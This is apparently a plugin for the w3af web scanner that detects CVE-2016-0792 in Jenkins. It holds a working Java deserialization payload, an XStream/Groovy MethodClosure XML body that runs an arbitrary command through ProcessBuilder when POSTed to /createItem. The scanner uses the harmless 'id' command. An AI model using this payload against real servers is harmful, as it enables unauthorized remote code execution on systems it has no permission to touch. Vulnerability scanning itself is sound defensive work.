from w3af.core.controllers.plugins.infrastructure_plugin import InfrastructurePlugin
from w3af.core.data.request.fuzzable_http_request import FuzzableHTTPRequest
from w3af.core.data.bloomfilter.scalable_bloom import ScalableBloomFilter
from w3af.core.data.dc.headers import Headers
import w3af.core.controllers.output_manager as om

import re, random, string


class cve_2016_0792(InfrastructurePlugin):
	"""
	Detect CVE 2016-0792 (Jenkins < 1.650 - Java Deserialization)
	"""
	NAME = "CVE 2016-0792"
	EXPLOIT_COMMAND = "id"
	EXPLOIT_PATTERN = "uid=[0-9]+\(.*?\) gid=[0-9]+\(.*?\) groups=[0-9]+\(.*?\)(,[0-9]+\(.*?\))*"

	def __init__(self):
		InfrastructurePlugin.__init__(self)
		self._already_tested_dirs = ScalableBloomFilter()
		self._jenkin_dirs = set()

	def discover(self, fuzzable_http_request):
		for u in fuzzable_http_request.get_url().get_directories():
			if u.url_string not in self._already_tested_dirs:
				for d in self._jenkin_dirs:
					if d in u:
						break
				else:
					self._already_tested_dirs.add(u.url_string)
					self.exploit(u)

	@staticmethod
	def prepare_payload(command):
		split_command = command.split()
		prepared_commands = ''

		for entry in split_command:
			prepared_commands += '<string>{entry}</string>'.format(entry=entry)
	
		xml = '''
			<map>
			  <entry>
				<groovy.util.Expando>
				  <expandoProperties>
					<entry>
					  <string>hashCode</string>
					  <org.codehaus.groovy.runtime.MethodClosure>
						<delegate class="groovy.util.Expando"/>
						<owner class="java.lang.ProcessBuilder">
						  <command>{prepared_commands}</command>
						  <redirectErrorStream>false</redirectErrorStream>
						</owner>
						<resolveStrategy>0</resolveStrategy>
						<directive>0</directive>
						<method>start</method>
					  </org.codehaus.groovy.runtime.MethodClosure>
					</entry>
				  </expandoProperties>
				</groovy.util.Expando>
				<int>1</int>
			  </entry>
			</map>'''.format(prepared_commands=prepared_commands)
		return xml

	def exploit(self, url):
		payload = self.prepare_payload(self.EXPLOIT_COMMAND)
		job_name = ''.join(random.SystemRandom().choice(string.ascii_lowercase + string.digits) for _ in range(8))
		exploit_path = "/createItem?name={job_name}".format(job_name=job_name)
		post_url = url.url_join(exploit_path)
		headers = Headers()
		headers["Content-Type"] = "application/xml"
		response = self.requestor.http.HEAD(url)
		try:
			version = response.headers["x-jenkins"]
		except KeyError:
			return False
		else:
			fr = FuzzableHTTPRequest.from_http_response(response)
			self.kb_update_web_technology("Jenkins", version=version, mutant=fr, traffic_ids=response.id)
			response = self.requestor.http.POST(post_url, data=payload, headers=headers, cache=False, grep=False)

			match = re.search(self.EXPLOIT_PATTERN, response.get_body())
			if match:
				vuln_data = {
					"cmd": self.EXPLOIT_COMMAND,
					"exploited": match.group(1)
				}
				fr = FuzzableHTTPRequest.from_parts(url)
				vuln = self.create_vuln("CVE-2016-0792 (Jenkins < 1.650 - Java Deserialization)", traffic_ids=response.id, mutant=fr, data=vuln_data)
				self.save_vuln(vuln, vuln_type="jenkins")
				return True
			return False
